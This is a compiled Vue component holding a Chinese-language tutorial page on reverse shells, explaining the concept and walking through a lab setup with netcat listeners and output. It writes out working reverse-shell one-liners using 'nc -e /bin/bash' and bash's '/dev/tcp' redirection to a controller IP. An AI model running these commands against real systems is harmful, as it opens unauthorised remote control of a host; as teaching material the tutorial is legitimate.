import{_ as n}from"./plugin-vue_export-helper-x3n3nnut.js";import{o as s,c as a,f as e}from"./app-BGVzWW7v.js";const t={},i=e(`<h2 id="什么是-shell" tabindex="-1"><a class="header-anchor" href="#什么是-shell" aria-hidden="true">#</a> 什么是 Shell</h2><p>Shell 就是实现用户命令的接口，通过这个接口我们就能实现对计算机的控制，比如：我们常见的 ssh 就是执行的 Shell 命令实现对远程对服务器的控制。</p><h2 id="什么是反弹-shell" tabindex="-1"><a class="header-anchor" href="#什么是反弹-shell" aria-hidden="true">#</a> 什么是反弹 Shell</h2><p>其英文名叫做 <code>Reverse Shell</code>，就是控制端首先监听某个 <code>TCP/UDP</code> 端口，然后被控制端向这个端口发起一个请求，同时将自己命令行的输入输出转移到控制端，从而控制端就可以输入命令来控制被控端了。</p><p>比如说，我们有两台主机 A、B，我们最终想实现在 A 上控制 B。那么如果用正向 Shell，其实就是在 A 上输入 B 的连接地址，比如通过 ssh 连接到 B，连接成功之后，我们就可以在 A 上通过命令控制 B 了。如果用反向 Shell，那就是在 A 上先开启一个监听端口，然后让 B 去连接 A 的这个端口，连接成功之后，A 这边就能通过命令控制 B 了。</p><h2 id="反弹-shell-的作用" tabindex="-1"><a class="header-anchor" href="#反弹-shell-的作用" aria-hidden="true">#</a> 反弹 Shell 的作用</h2><p>当我们使用 A 控制 B，但由于被控端因防火墙受限、权限不足、端口被占用等无法直接连接。这时我们就要使用反弹 Shell 让 B 向 A 主动发起连接，我们就可以使用 A 来控制 B 了。</p><h2 id="使用方法" tabindex="-1"><a class="header-anchor" href="#使用方法" aria-hidden="true">#</a> 使用方法</h2><table><thead><tr><th style="text-align:center;">控制端</th><th style="text-align:center;">被控制端</th></tr></thead><tbody><tr><td style="text-align:center;">IP：192.168.4.151</td><td style="text-align:center;">IP：192.168.4.142</td></tr><tr><td style="text-align:center;">hostname：root@localhost</td><td style="text-align:center;">hostname：root@dev_03</td></tr></tbody></table><ol><li><p>控制端和被控制端都安装 nc 命令</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>yum <span class="token parameter variable">-y</span> <span class="token function">install</span> <span class="token function">nc</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li><li><p>监听端口。在控制端上执行 <code>nc -lvvp 9999</code> 命令</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># nc -lvvp 9999</span>
Ncat: Version <span class="token number">7.70</span> <span class="token punctuation">(</span> https://nmap.org/ncat <span class="token punctuation">)</span>  <span class="token comment"># 输出结果</span>
Ncat: Listening on :::9999
Ncat: Listening on <span class="token number">0.0</span>.0.0:9999
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><strong>-l</strong>：监听模式，用于入站连接</li><li><strong>-vv</strong>：<code>-vv</code> 比 <code>-v</code> 更详细的输出</li><li><strong>-p</strong>：设置本地端口</li></ul></li><li><p>发起连接请求。在被控制端上执行 <code>nc -e /bin/bash [控制端的 IP] 9999</code> 命令</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>root@dev_03:~<span class="token comment"># nc -e /bin/bash 192.168.4.151 9999</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li><strong>-e</strong>：绑定命令行</li></ul><div class="hint-container tip"><p class="hint-container-title">提示</p><p>如果没有 <code>-e</code> 这个参数，是因为 <code>nc</code> 老版本没有这个选项的。需要安装 <code>netcat-traditional</code> 这个包，并执行 <code>update-alternatives --config nc</code> 这个命令，选择 <code>/bin/nc.traditional</code> 的编号，这里选择编号 <code>2</code> 即可</p></div></li><li><p>控制端接收连接请求。被控制端发起连接请求后，查看控制端</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># nc -lvvp 9999</span>
Ncat: Version <span class="token number">7.70</span> <span class="token punctuation">(</span> https://nmap.org/ncat <span class="token punctuation">)</span>
Ncat: Listening on :::9999
Ncat: Listening on <span class="token number">0.0</span>.0.0:9999
Ncat: Connection from <span class="token number">192.168</span>.4.142.
Ncat: Connection from <span class="token number">192.168</span>.4.142:39064.
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>测试。控制端进行测试</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># nc -lvvp 9999</span>
Ncat: Version <span class="token number">7.70</span> <span class="token punctuation">(</span> https://nmap.org/ncat <span class="token punctuation">)</span>
Ncat: Listening on :::9999
Ncat: Listening on <span class="token number">0.0</span>.0.0:9999
Ncat: Connection from <span class="token number">192.168</span>.4.142.
Ncat: Connection from <span class="token number">192.168</span>.4.142:39064.

<span class="token function">uname</span> <span class="token parameter variable">-a</span>
Linux dev_03 <span class="token number">4.15</span>.0-193-generic <span class="token comment">#204-Ubuntu SMP Fri Aug 26 19:20:21 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span>

<span class="token function">ifconfig</span> ens33
ens33: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">416</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">&gt;</span>  mtu <span class="token number">1500</span>
        inet <span class="token number">192.168</span>.4.142  netmask <span class="token number">255.255</span>.255.0  broadcast <span class="token number">192.168</span>.4.255
        inet6 fe80::20c:29ff:fe14:1e21  prefixlen <span class="token number">64</span>  scopeid 0x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token operator">&gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ol><h2 id="被控制端使用-bash-发起连接" tabindex="-1"><a class="header-anchor" href="#被控制端使用-bash-发起连接" aria-hidden="true">#</a> 被控制端使用 bash 发起连接</h2><p>被控制端也可以不用安装 nc 这个命令发起连接，可以直接使用 bash 来实现。</p><ol><li><p>监听端口。在控制端上执行 <code>nc -lvvp 9999</code> 命令</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># nc -lvvp 9999</span>
Ncat: Version <span class="token number">7.70</span> <span class="token punctuation">(</span> https://nmap.org/ncat <span class="token punctuation">)</span>  <span class="token comment"># 输出结果</span>
Ncat: Listening on :::9999
Ncat: Listening on <span class="token number">0.0</span>.0.0:9999
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>发起连接请求。在被控制端上执行 <code>bash -i &gt;&amp; /dev/tcp/[控制端的 IP]/9999 0&gt;&amp;1</code> 命令</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>root@dev_03:~<span class="token comment"># bash -i &gt;&amp; /dev/tcp/192.168.4.151/9999 0&gt;&amp;1</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li><strong>bash -i</strong>：就是产生一个 bash 交互环境</li><li><strong>&gt;&amp;</strong>：可以将 bash 交互环境的输入、输出、错误输出都输出到一个地方</li><li><strong>/dev/tcp/[控制端的 IP]/9999</strong>：指的是目标主机的一个连接地址，因为 Linux 环境中所有内容的定义都是以文件的形式存在的，指定这个地址就是让主机和目标主机建立一个 TCP 连接</li><li><strong>0&gt;&amp;1</strong>：可以将标准输入和标准输出相结合，重定向给前面标准输出的内容</li></ul><p>通过这样的命令，我们就可以就是将被控制端的标准输出和错误输出都重定向给控制端，并且将控制端的输入都重定向给被控制端，这样我们就可以实现控制端对被控制端的远程控制了。</p></li><li><p>控制端接收连接请求。被控制端发起连接请求后，查看控制端，会显示被控制端的 localhost</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># nc -lvvp 9999</span>
Ncat: Version <span class="token number">7.70</span> <span class="token punctuation">(</span> https://nmap.org/ncat <span class="token punctuation">)</span>
Ncat: Listening on :::9999
Ncat: Listening on <span class="token number">0.0</span>.0.0:9999
Ncat: Connection from <span class="token number">192.168</span>.4.142.
Ncat: Connection from <span class="token number">192.168</span>.4.142:34944.
root@dev_03:~<span class="token comment">#</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>测试。控制端进行测试</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># nc -lvvp 9999</span>
Ncat: Version <span class="token number">7.70</span> <span class="token punctuation">(</span> https://nmap.org/ncat <span class="token punctuation">)</span>
Ncat: Listening on :::9999
Ncat: Listening on <span class="token number">0.0</span>.0.0:9999
Ncat: Connection from <span class="token number">192.168</span>.4.142.
Ncat: Connection from <span class="token number">192.168</span>.4.142:34944.
root@dev_03:~<span class="token comment">#</span>

root@dev_03:~<span class="token comment"># uname -a</span>
<span class="token function">uname</span> <span class="token parameter variable">-a</span>
Linux dev_03 <span class="token number">4.15</span>.0-193-generic <span class="token comment">#204-Ubuntu SMP Fri Aug 26 19:20:21 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span>
root@dev_03:~<span class="token comment">#</span>

root@dev_03:~<span class="token comment"># ifconfig ens33</span>
ens33: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">416</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">&gt;</span>  mtu <span class="token number">1500</span>
        inet <span class="token number">192.168</span>.4.142  netmask <span class="token number">255.255</span>.255.0  broadcast <span class="token number">192.168</span>.4.255
        inet6 fe80::20c:29ff:fe14:1e21  prefixlen <span class="token number">64</span>  scopeid 0x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token operator">&gt;</span>
root@dev_03:~<span class="token comment">#</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ol>`,13),l=[i];function c(o,p){return s(),a("div",null,l)}const u=n(t,[["render",c],["__file","rebound_shell.html.vue"]]);export{u as default};
